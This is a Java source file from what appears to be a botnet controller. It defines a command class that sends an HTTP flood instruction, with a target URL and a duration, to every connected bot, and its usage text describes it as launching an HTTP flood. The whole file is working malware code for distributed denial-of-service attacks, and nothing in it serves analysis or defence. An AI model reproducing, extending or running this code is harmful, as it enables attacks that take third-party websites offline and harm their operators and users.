package com.redpois0n.commands;

import com.redpois0n.bot.Bot;
import com.redpois0n.bot.Main;
import com.redpois0n.common.packets.Headers;
import com.redpois0n.exceptions.IllegalArgumentLengthException;


public class CommandHttp  extends Command {

	/**
	 * Begins http flood
	 */
	@Override
	public void execute(String[] args, Bot[] bots) throws Exception {
		if (args.length != 2) {
			throw new IllegalArgumentLengthException();
		}
		
		int time = Integer.parseInt(args[1]);
		
		for (int i = 0; i < bots.length; i++) {
			try {
				Bot bot = bots[i];
				bot.writeByte(Headers.PACKET_HTTP_FLOOD);
				bot.writeString(args[0]);
				bot.writeInt(time);
			} catch (Exception ex) {
				Main.handleException(ex);
			}
		}
	}

	@Override
	public String getUsage() {
		return "http [URL] [TIME]";
	}

	@Override
	public String getExample() {
		return "http http://www.example.com 10";
	}

	@Override
	public String getDescription() {
		return "Launches HTTP flood";
	}

}

